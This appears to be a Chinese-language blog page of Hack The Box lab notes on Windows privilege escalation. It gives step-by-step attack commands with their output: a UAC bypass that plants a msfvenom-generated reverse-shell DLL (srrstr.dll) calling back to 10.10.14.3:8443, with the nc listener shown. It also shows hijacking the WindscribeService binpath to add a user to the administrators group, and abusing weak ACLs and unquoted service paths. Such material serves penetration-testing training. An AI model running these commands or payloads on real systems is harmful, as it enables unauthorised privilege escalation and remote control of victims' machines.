<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">REG</span> <span class="title">QUERY</span> <span class="title">HKEY_LOCAL_MACHINE</span>\<span class="title">Software</span>\<span class="title">Microsoft</span>\<span class="title">Windows</span>\<span class="title">CurrentVersion</span>\<span class="title">Policies</span>\<span class="title">System</span>\ /<span class="title">v</span> <span class="title">ConsentPromptBehaviorAdmin</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">HKEY_LOCAL_MACHINE</span>\<span class="title">Software</span>\<span class="title">Microsoft</span>\<span class="title">Windows</span>\<span class="title">CurrentVersion</span>\<span class="title">Policies</span>\<span class="title">System</span></span></span><br><span class="line"><span class="function">    <span class="title">ConsentPromptBehaviorAdmin</span>    <span class="title">REG_DWORD</span>    0<span class="title">x5</span></span></span><br></pre></td></tr></table></figure>

<p><code>ConsentPromptBehaviorAdmin</code>的值为<code>0x5</code>，表示<code>Always notify</code>启用了最高级别的 UAC 。此最高级别的 UAC 绕过较少。</p>
<p>UAC 绕过利用了不同 Windows 版本中的缺陷或意外功能。检查一下想要提升的 Windows 版本。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; [<span class="type">environment</span>]::OSVersion.Version</span><br><span class="line"></span><br><span class="line">Major  Minor  Build  Revision</span><br><span class="line"><span class="literal">-----</span>  <span class="literal">-----</span>  <span class="literal">-----</span>  <span class="literal">--------</span></span><br><span class="line"><span class="number">10</span>     <span class="number">0</span>      <span class="number">14393</span>  <span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>返回内部版本 14393，使用<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Windows_10_version_history">此页面</a>交叉引用 Windows 版本<code>1607</code>。</p>
<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1732190459118.png" alt="build"></p>
<p><a target="_blank" rel="noopener" href="https://github.com/hfiref0x/UACME">UACME</a>项目维护着一个 UAC 绕过列表，包括受影响的 Windows 版本号、所用技术以及 Microsoft 是否已发布安全更新来修复它的信息。技术编号 54，据说该技术从 Windows 10 版本 14393 开始工作。此技术针对自动提升二进制文件的 32 位版本<code>SystemPropertiesAdvanced.exe</code>。Windows 将允许许多受信任的二进制文件自动提升权限，而无需 UAC 同意提示。</p>
<p>当尝试定位 DLL 时，Windows 将使用以下搜索顺序：</p>
<ol>
<li>应用程序加载的目录。</li>
<li><code>C:\Windows\System32</code>64位系统的系统目录。</li>
<li>16 位系统目录<code>C:\Windows\System</code>（不支持 64 位系统）</li>
<li>Windows 目录。</li>
<li>PATH 环境变量中列出的任何目录。</li>
</ol>
<p>检查路径变量</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; cmd /c <span class="built_in">echo</span> %PATH%</span><br><span class="line"></span><br><span class="line">C:\Windows\system32;</span><br><span class="line">C:\Windows;</span><br><span class="line">C:\Windows\System32\Wbem;</span><br><span class="line">C:\Windows\System32\WindowsPowerShell\v1.<span class="number">0</span>\;</span><br><span class="line">C:\Users\sarah\AppData\Local\Microsoft\WindowsApps;</span><br></pre></td></tr></table></figure>

<p>通过 DLL 劫持来绕过 UAC，方法是将恶意<code>srrstr.dll</code> 放置到<code>WindowsApps</code>文件夹中，该 DLL 将在提升的上下文中加载。</p>
<p>生成一个 DLL 来执行反向 shell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8443 -f dll &gt; srrstr.dll</span><br></pre></td></tr></table></figure>

<p>如果执行恶意<code>srrstr.dll</code>文件，将收到一个显示正常用户权限（已启用 UAC）的 shell。为了测试这一点，可以运行 DLL<code>rundll32.exe</code>来获取反向 shell 连接。</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">rundll32</span> <span class="title">shell32.dll</span>,<span class="title">Control_RunDLL</span> <span class="title">C</span>:\<span class="title">Users</span>\<span class="title">sarah</span>\<span class="title">AppData</span>\<span class="title">Local</span>\<span class="title">Microsoft</span>\<span class="title">WindowsApps</span>\<span class="title">srrstr.dll</span></span></span><br></pre></td></tr></table></figure>

<p>一旦重新建立连接，将看到正常的用户权限。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$ nc -lnvp 8443</span><br><span class="line"></span><br><span class="line">listening on [any] 8443 ...</span><br><span class="line"></span><br><span class="line">connect to [10.10.14.3] from (UNKNOWN) [10.129.43.16] 49789</span><br><span class="line">Microsoft Windows [Version 10.0.14393]</span><br><span class="line">(c) 2016 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\Users\sarah&gt; whoami /priv</span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">Privilege Name                Description                          State   </span><br><span class="line">============================= ==================================== ========</span><br><span class="line">SeShutdownPrivilege           Shut down the system                 Disabled</span><br><span class="line">SeChangeNotifyPrivilege       Bypass traverse checking             Enabled </span><br><span class="line">SeUndockPrivilege             Remove computer from docking station Disabled</span><br><span class="line">SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled</span><br><span class="line">SeTimeZonePrivilege           Change the time zone                 Disabled</span><br></pre></td></tr></table></figure>

<p>再执行 SystemPropertiesAdvanced.exe</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">C</span>:\<span class="title">Windows</span>\<span class="title">SysWOW64</span>\<span class="title">SystemPropertiesAdvanced.exe</span></span></span><br></pre></td></tr></table></figure>

<p>收到了一个提升的shell，表明权限可用，并且可以在需要时启用。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">$ nc -lvnp 8443</span><br><span class="line"></span><br><span class="line">listening on [any] 8443 ...</span><br><span class="line">connect to [10.10.14.3] from (UNKNOWN) [10.129.43.16] 50273</span><br><span class="line">Microsoft Windows [Version 10.0.14393]</span><br><span class="line">(c) 2016 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;whoami</span><br><span class="line"></span><br><span class="line">whoami</span><br><span class="line">winlpe-ws03\sarah</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;whoami /priv</span><br><span class="line"></span><br><span class="line">whoami /priv</span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line">----------------------</span><br><span class="line">Privilege Name                            Description                                                        State</span><br><span class="line">========================================= ================================================================== ========</span><br><span class="line">SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled</span><br><span class="line">SeSecurityPrivilege                       Manage auditing and security log                                   Disabled</span><br><span class="line">SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled</span><br><span class="line">SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled</span><br><span class="line">SeSystemProfilePrivilege                  Profile system performance                                         Disabled</span><br><span class="line">SeSystemtimePrivilege                     Change the system time                                             Disabled</span><br><span class="line">SeProfileSingleProcessPrivilege           Profile single process                                             Disabled</span><br><span class="line">SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Disabled</span><br><span class="line">SeCreatePagefilePrivilege                 Create a pagefile                                                  Disabled</span><br><span class="line">SeBackupPrivilege                         Back up files and directories                                      Disabled</span><br><span class="line">SeRestorePrivilege                        Restore files and directories                                      Disabled</span><br><span class="line">SeShutdownPrivilege                       Shut down the system                                               Disabled</span><br><span class="line">SeDebugPrivilege                          Debug programs                                                     Disabled</span><br><span class="line">SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled</span><br><span class="line">SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled</span><br><span class="line">SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Disabled</span><br><span class="line">SeUndockPrivilege                         Remove computer from docking station                               Disabled</span><br><span class="line">SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled</span><br><span class="line">SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled</span><br><span class="line">SeCreateGlobalPrivilege                   Create global objects                                              Enabled</span><br><span class="line">SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Disabled</span><br><span class="line">SeTimeZonePrivilege                       Change the time zone                                               Disabled</span><br><span class="line">SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Disabled</span><br><span class="line">SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Disabled</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="Weak-Permissions"><a href="#Weak-Permissions" class="headerlink" title="Weak Permissions"></a>Weak Permissions</h1><p>Windows 系统上的权限设置非常复杂，很难正确设置。一个地方的轻微修改可能会在其他地方引入漏洞。</p>
<h2 id="Permissive-File-System-ACLs"><a href="#Permissive-File-System-ACLs" class="headerlink" title="Permissive File System ACLs"></a>Permissive File System ACLs</h2><h3 id="enumeration"><a href="#enumeration" class="headerlink" title="enumeration"></a>enumeration</h3><p>GhostPack 工具套件中的<a target="_blank" rel="noopener" href="https://github.com/GhostPack/SharpUp/">SharpUp</a>来检查是否存在弱 ACL 的服务二进制文件。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; .\SharpUp.exe audit</span><br><span class="line"></span><br><span class="line">=== SharpUp: Running Privilege Escalation Checks ===</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">=== Modifiable Service Binaries ===</span><br><span class="line"></span><br><span class="line">  Name             : SecurityService</span><br><span class="line">  DisplayName      : PC Security Management Service</span><br><span class="line">  Description      : Responsible <span class="keyword">for</span> managing PC security</span><br><span class="line">  State            : Stopped</span><br><span class="line">  StartMode        : Auto</span><br><span class="line">  PathName         : <span class="string">&quot;C:\Program Files (x86)\PCProtect\SecurityService.exe&quot;</span></span><br><span class="line">  </span><br><span class="line">  &lt;SNIP&gt;</span><br><span class="line">  </span><br></pre></td></tr></table></figure>

<p>使用 <a target="_blank" rel="noopener" href="https://ss64.com/nt/icacls.html">icacls</a> 可以验证漏洞并看到<code>EVERYONE</code>和<code>BUILTIN\Users</code>组已被授予该目录的完全权限，因此任何非特权系统用户都可以操作该目录及其内容。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; icacls <span class="string">&quot;C:\Program Files (x86)\PCProtect\SecurityService.exe&quot;</span></span><br><span class="line"></span><br><span class="line">C:\Program Files (x86)\PCProtect\SecurityService.exe BUILTIN\Users:(I)(F)</span><br><span class="line">                                                     Everyone:(I)(F)</span><br><span class="line">                                                     NT AUTHORITY\SYSTEM:(I)(F)</span><br><span class="line">                                                     BUILTIN\Administrators:(I)(F)</span><br><span class="line">                                                     APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)</span><br><span class="line">                                                     APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)</span><br><span class="line"></span><br><span class="line">Successfully processed <span class="number">1</span> files; Failed processing <span class="number">0</span> files</span><br></pre></td></tr></table></figure>

<h3 id="Replacing-Service-Binary"><a href="#Replacing-Service-Binary" class="headerlink" title="Replacing Service Binary"></a>Replacing Service Binary</h3><p>此服务也可由非特权用户启动，因此可以备份原始二进制文件，并将其替换为生成的恶意二进制文件<code>msfvenom</code>。</p>
<h2 id="Weak-Service-Permissions"><a href="#Weak-Service-Permissions" class="headerlink" title="Weak Service Permissions"></a>Weak Service Permissions</h2><h3 id="enumeration-1"><a href="#enumeration-1" class="headerlink" title="enumeration"></a>enumeration</h3><p>SharpUp 发现<code>WindscribeService</code>可能配置错误。</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">SharpUp.exe</span> <span class="title">audit</span></span></span><br><span class="line"><span class="function"> </span></span><br><span class="line"><span class="function">=== <span class="title">SharpUp</span>: <span class="title">Running</span> <span class="title">Privilege</span> <span class="title">Escalation</span> <span class="title">Checks</span> ===</span></span><br><span class="line"><span class="function"> </span></span><br><span class="line"><span class="function"> </span></span><br><span class="line"><span class="function">=== <span class="title">Modifiable</span> <span class="title">Services</span> ===</span></span><br><span class="line"><span class="function"> </span></span><br><span class="line"><span class="function">  <span class="title">Name</span>             : <span class="title">WindscribeService</span></span></span><br><span class="line"><span class="function">  <span class="title">DisplayName</span>      : <span class="title">WindscribeService</span></span></span><br><span class="line"><span class="function">  <span class="title">Description</span>      : <span class="title">Manages</span> <span class="title">the</span> <span class="title">firewall</span> <span class="title">and</span> <span class="title">controls</span> <span class="title">the</span> <span class="title">VPN</span> <span class="title">tunnel</span></span></span><br><span class="line"><span class="function">  <span class="title">State</span>            : <span class="title">Running</span></span></span><br><span class="line"><span class="function">  <span class="title">StartMode</span>        : <span class="title">Auto</span></span></span><br><span class="line"><span class="function">  <span class="title">PathName</span>         : &quot;<span class="title">C</span>:\<span class="title">Program</span> <span class="title">Files</span> (<span class="title">x86</span>)\<span class="title">Windscribe</span>\<span class="title">WindscribeService.exe</span>&quot;</span></span><br></pre></td></tr></table></figure>

<p>Sysinternals 套件中的<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk">AccessChk</a>枚举服务的权限。</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">accesschk.exe</span> /<span class="title">accepteula</span> -<span class="title">quvcw</span> <span class="title">WindscribeService</span></span></span><br><span class="line"><span class="function"> </span></span><br><span class="line"><span class="function"><span class="title">Accesschk</span> <span class="title">v6</span>.13 - <span class="title">Reports</span> <span class="title">effective</span> <span class="title">permissions</span> <span class="title">for</span> <span class="title">securable</span> <span class="title">objects</span></span></span><br><span class="line"><span class="function"><span class="title">Copyright</span> ⌐ 2006-2020 <span class="title">Mark</span> <span class="title">Russinovich</span></span></span><br><span class="line"><span class="function"><span class="title">Sysinternals</span> - <span class="title">www.sysinternals.com</span></span></span><br><span class="line"><span class="function"> </span></span><br><span class="line"><span class="function"><span class="title">WindscribeService</span></span></span><br><span class="line"><span class="function">  <span class="title">Medium</span> <span class="title">Mandatory</span> <span class="title">Level</span> (<span class="title">Default</span>) [<span class="title">No</span>-<span class="title">Write</span>-<span class="title">Up</span>]</span></span><br><span class="line"><span class="function">  <span class="title">RW</span> <span class="title">NT</span> <span class="title">AUTHORITY</span>\<span class="title">SYSTEM</span></span></span><br><span class="line"><span class="function">        <span class="title">SERVICE_ALL_ACCESS</span></span></span><br><span class="line"><span class="function">  <span class="title">RW</span> <span class="title">BUILTIN</span>\<span class="title">Administrators</span></span></span><br><span class="line"><span class="function">        <span class="title">SERVICE_ALL_ACCESS</span></span></span><br><span class="line"><span class="function">  <span class="title">RW</span> <span class="title">NT</span> <span class="title">AUTHORITY</span>\<span class="title">Authenticated</span> <span class="title">Users</span></span></span><br><span class="line"><span class="function">        <span class="title">SERVICE_ALL_ACCESS</span></span></span><br></pre></td></tr></table></figure>

<h3 id="更改服务文件路径"><a href="#更改服务文件路径" class="headerlink" title="更改服务文件路径"></a>更改服务文件路径</h3><p>更改它以将用户添加到本地管理员组。可以设置二进制路径来运行选择的任何命令或可执行文件（例如反向 shell 二进制文件）。</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">sc</span> <span class="title">config</span> <span class="title">WindscribeService</span> <span class="title">binpath</span>=&quot;<span class="title">cmd</span> /<span class="title">c</span> <span class="title">net</span> <span class="title">localgroup</span> <span class="title">administrators</span> <span class="title">htb</span>-<span class="title">student</span> /<span class="title">add</span>&quot;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">[<span class="title">SC</span>] <span class="title">ChangeServiceConfig</span> <span class="title">SUCCESS</span></span></span><br></pre></td></tr></table></figure>

<p>重启服务，由于完全控制了该服务，因此可以启动它，并且即使返回错误消息，放置在<code>binpath</code>中的命令也会运行。服务无法启动，因为<code>binpath</code>未指向实际的服务可执行文件。</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">sc</span> <span class="title">stop</span> <span class="title">WindscribeService</span></span></span><br><span class="line"><span class="function"> </span></span><br><span class="line"><span class="function"><span class="title">SERVICE_NAME</span>: <span class="title">WindscribeService</span></span></span><br><span class="line"><span class="function">        <span class="title">TYPE</span>               : 10  <span class="title">WIN32_OWN_PROCESS</span></span></span><br><span class="line"><span class="function">        <span class="title">STATE</span>              : 3  <span class="title">STOP_PENDING</span></span></span><br><span class="line"><span class="function">                                (<span class="title">NOT_STOPPABLE</span>, <span class="title">NOT_PAUSABLE</span>, <span class="title">IGNORES_SHUTDOWN</span>)</span></span><br><span class="line"><span class="function">        <span class="title">WIN32_EXIT_CODE</span>    : 0  (0<span class="title">x0</span>)</span></span><br><span class="line"><span class="function">        <span class="title">SERVICE_EXIT_CODE</span>  : 0  (0<span class="title">x0</span>)</span></span><br><span class="line"><span class="function">        <span class="title">CHECKPOINT</span>         : 0<span class="title">x4</span></span></span><br><span class="line"><span class="function">        <span class="title">WAIT_HINT</span>          : 0<span class="title">x0</span></span></span><br><span class="line"><span class="function">        </span></span><br><span class="line"><span class="function"><span class="title">C</span>:\&gt; <span class="title">sc</span> <span class="title">start</span> <span class="title">WindscribeService</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">[<span class="title">SC</span>] <span class="title">StartService</span> <span class="title">FAILED</span> 1053:</span></span><br><span class="line"><span class="function"> </span></span><br><span class="line"><span class="function"><span class="title">The</span> <span class="title">service</span> <span class="title">did</span> <span class="title">not</span> <span class="title">respond</span> <span class="title">to</span> <span class="title">the</span> <span class="title">start</span> <span class="title">or</span> <span class="title">control</span> <span class="title">request</span> <span class="title">in</span> <span class="title">a</span> <span class="title">timely</span> <span class="title">fashion</span>.</span></span><br></pre></td></tr></table></figure>

<p>确认本地管理员组添加</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">net</span> <span class="title">localgroup</span> <span class="title">administrators</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Alias</span> <span class="title">name</span>     <span class="title">administrators</span></span></span><br><span class="line"><span class="function"><span class="title">Comment</span>        <span class="title">Administrators</span> <span class="title">have</span> <span class="title">complete</span> <span class="title">and</span> <span class="title">unrestricted</span> <span class="title">access</span> <span class="title">to</span> <span class="title">the</span> <span class="title">computer</span>/<span class="title">domain</span></span></span><br><span class="line"><span class="function"> </span></span><br><span class="line"><span class="function"><span class="title">Members</span></span></span><br><span class="line"><span class="function"> </span></span><br><span class="line"><span class="function">-------------------------------------------------------------------------------</span></span><br><span class="line"><span class="function"><span class="title">Administrator</span></span></span><br><span class="line"><span class="function"><span class="title">htb</span>-<span class="title">student</span></span></span><br><span class="line"><span class="function"><span class="title">mrb3n</span></span></span><br><span class="line"><span class="function"><span class="title">The</span> <span class="title">command</span> <span class="title">completed</span> <span class="title">successfully</span>.</span></span><br></pre></td></tr></table></figure>

<h3 id="Clean-2"><a href="#Clean-2" class="headerlink" title="Clean"></a>Clean</h3><p>可以通过停止服务并将二进制路径重置回原始服务可执行文件来自行清理并确保服务正常运行。</p>
<p>恢复二进制路径</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">sc</span> <span class="title">config</span> <span class="title">WindScribeService</span> <span class="title">binpath</span>=&quot;<span class="title">c</span>:\<span class="title">Program</span> <span class="title">Files</span> (<span class="title">x86</span>)\<span class="title">Windscribe</span>\<span class="title">WindscribeService.exe</span>&quot;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">[<span class="title">SC</span>] <span class="title">ChangeServiceConfig</span> <span class="title">SUCCESS</span></span></span><br></pre></td></tr></table></figure>

<p>重启服务</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">sc</span> <span class="title">start</span> <span class="title">WindScribeService</span></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\&gt; <span class="title">sc</span> <span class="title">query</span> <span class="title">WindScribeService</span></span></span><br></pre></td></tr></table></figure>

<h2 id="Unquoted-Service-Path"><a href="#Unquoted-Service-Path" class="headerlink" title="Unquoted Service Path"></a>Unquoted Service Path</h2><p>安装服务时，注册表配置会指定服务启动时应执行的二进制文件的路径。如果此二进制文件未用引号括起来，Windows 将尝试在不同的文件夹中查找该二进制文件。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe</span><br></pre></td></tr></table></figure>

<p>Windows 将在服务启动时尝试按顺序加载以下潜在可执行文件，其中隐含 .exe：</p>
<ul>
<li><code>C:\Program</code></li>
<li><code>C:\Program Files</code></li>
<li><code>C:\Program Files (x86)\System</code></li>
<li><code>C:\Program Files (x86)\System Explorer\service\SystemExplorerService64</code></li>
</ul>
<p>查询服务</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">sc</span> <span class="title">qc</span> <span class="title">SystemExplorerHelpService</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">[<span class="title">SC</span>] <span class="title">QueryServiceConfig</span> <span class="title">SUCCESS</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">SERVICE_NAME</span>: <span class="title">SystemExplorerHelpService</span></span></span><br><span class="line"><span class="function">        <span class="title">TYPE</span>               : 20  <span class="title">WIN32_SHARE_PROCESS</span></span></span><br><span class="line"><span class="function">        <span class="title">START_TYPE</span>         : 2   <span class="title">AUTO_START</span></span></span><br><span class="line"><span class="function">        <span class="title">ERROR_CONTROL</span>      : 0   <span class="title">IGNORE</span></span></span><br><span class="line"><span class="function">        <span class="title">BINARY_PATH_NAME</span>   : <span class="title">C</span>:\<span class="title">Program</span> <span class="title">Files</span> (<span class="title">x86</span>)\<span class="title">System</span> <span class="title">Explorer</span>\<span class="title">service</span>\<span class="title">SystemExplorerService64.exe</span></span></span><br><span class="line"><span class="function">        <span class="title">LOAD_ORDER_GROUP</span>   :</span></span><br><span class="line"><span class="function">        <span class="title">TAG</span>                : 0</span></span><br><span class="line"><span class="function">        <span class="title">DISPLAY_NAME</span>       : <span class="title">System</span> <span class="title">Explorer</span> <span class="title">Service</span></span></span><br><span class="line"><span class="function">        <span class="title">DEPENDENCIES</span>       :</span></span><br><span class="line"><span class="function">        <span class="title">SERVICE_START_NAME</span> : <span class="title">LocalSystem</span></span></span><br></pre></td></tr></table></figure>

<p>如果可以创建以下文件，将能够劫持服务二进制文件并在服务上下文中获得命令执行，在本例中为<code>NT AUTHORITY\SYSTEM</code>。</p>
<ul>
<li><code>C:\Program.exe\</code></li>
<li><code>C:\Program Files (x86)\System.exe</code></li>
</ul>
<p>在驱动器根目录或程序文件文件夹中创建文件需要管理员权限。即使系统配置错误以允许这样做，用户也可能无法重新启动服务，并且需要依赖系统重新启动来提升权限。虽然发现服务路径未加引号的应用程序并不罕见，但通常很难被利用。</p>
<p>搜索未加引号的服务路径</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">wmic</span> <span class="title">service</span> <span class="title">get</span> <span class="title">name</span>,<span class="title">displayname</span>,<span class="title">pathname</span>,<span class="title">startmode</span> |<span class="title">findstr</span> /<span class="title">i</span> &quot;<span class="title">auto</span>&quot; | <span class="title">findstr</span> /<span class="title">i</span> /<span class="title">v</span> &quot;<span class="title">c</span>:\<span class="title">windows</span>\\&quot; | <span class="title">findstr</span> /<span class="title">i</span> /<span class="title">v</span> &quot;&quot;&quot;</span></span><br><span class="line"><span class="function"><span class="title">GVFS.Service</span>                                                                        <span class="title">GVFS.Service</span>                              <span class="title">C</span>:\<span class="title">Program</span> <span class="title">Files</span>\<span class="title">GVFS</span>\<span class="title">GVFS.Service.exe</span>                                                 <span class="title">Auto</span></span></span><br><span class="line"><span class="function"><span class="title">System</span> <span class="title">Explorer</span> <span class="title">Service</span>                                                             <span class="title">SystemExplorerHelpService</span>                 <span class="title">C</span>:\<span class="title">Program</span> <span class="title">Files</span> (<span class="title">x86</span>)\<span class="title">System</span> <span class="title">Explorer</span>\<span class="title">service</span>\<span class="title">SystemExplorerService64.exe</span>             <span class="title">Auto</span></span></span><br><span class="line"><span class="function"><span class="title">WindscribeService</span>            </span></span><br></pre></td></tr></table></figure>

<h2 id="Permissive-Registry-ACLs"><a href="#Permissive-Registry-ACLs" class="headerlink" title="Permissive Registry ACLs"></a>Permissive Registry ACLs</h2><p>检查注册表中是否存在弱服务 ACL</p>
